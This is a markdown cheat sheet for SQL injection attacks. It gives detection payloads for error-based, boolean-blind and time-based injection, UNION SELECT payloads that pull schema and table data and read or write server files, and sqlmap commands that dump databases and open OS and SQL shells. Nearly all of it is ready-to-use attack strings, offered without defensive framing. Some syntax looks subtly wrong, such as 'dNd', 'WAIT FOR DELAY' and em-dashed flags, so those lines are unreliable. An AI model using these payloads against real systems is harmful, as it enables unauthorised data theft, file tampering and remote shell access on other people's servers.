# SQL injection

The SQL injection is one of the most common code injection technique that aims at getting access to the database. It's possible by improper handling of user input by the application. 

Related to: <br />
-Language: SQL <br />
-Platform: Any (requires interaction with a SQL database) <br />

Types of SQL injection: <br />
1) Error based <br />
2) Boolean based blind <br />
3) Time based blind <br />

Toolset: Burp Suite, SQL Map. <br />

Detection
-----------------------------------------------------------------------------

Detection of Error based SQL injection:
```
'
"
#
;
)
```
Encoding:
```
%27
%22
%23
%3B
```
Multiple encoding:
```
%%2727
%%2222
%%2323
%%3B3B
```
Detection of Boolean based blind SQL injection:
TRUE statements:
```
aNd 1=1
aNd 21=21
anD 1=1;//
orDeR bY 1
```
FALSE statements:
```
dNd 0=1
anD 9=2
anD 57=276;//
ordEr bY 1000000000000
```
Characters to use instead of spaces:
```
+ 
/**/
%20
```
Comments to end the queries:
```
/*
//
#
%23
--
```

Detection of Time based blind:
```
aNd sleep
SLEEP(15)
BENCHMARK(100000000, rand())
WAIT FOR DELAY '00:00:15'
WAIT FOR TIME '00:00:15'
```


Exploitation
-----------------------------------------------------------------------------

General select syntax:
```
UniOn selEct [number of columns] [comment]
```

Example: Assume that there are 2 columns and column 2 can be used to display data on screen.
```
Seleting database version:
UniOn selEct 1,version() /*

Database:
UniOn selEct 1,database() /*

Database user:
UniOn selEct 1,user() /*

Database tables:
UniOn selEct 1,table_name frOm information_schema.tables where table_schema = '[database name]' /*

Table Columns:
UniOn selEct 1,column_name frOm information_schema.columns where table_name = '[table name]' /*

Selecting data from table:
UniOn selEct 1,[column name] frOm [table name] /*

Reading files:
UniOn selEct 1,load_file('file location') /*

Writing files:
UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*
```

SQL Map
-----------------------------------------------------------------------------

```
sqlmap -u [url] --- scan the provided url

sqlmap -u [url] —-dbs --- show the databases 

sqlmap -u “url” —-tables -D [database name] --- show all tables from [database name]

sqlmap -u “url” —-columns -T [table name] -D [database name] --- show all columns from [table name] in [database name]

sqlmap -u “url” -T [table name] -D [database name] —-dump --- show all data from [table name] in [database name]

sqlmap -u “url” —-os-shell --- OS shell 

sqlmap -u “url” —-sql-shell --- SQL shell
```
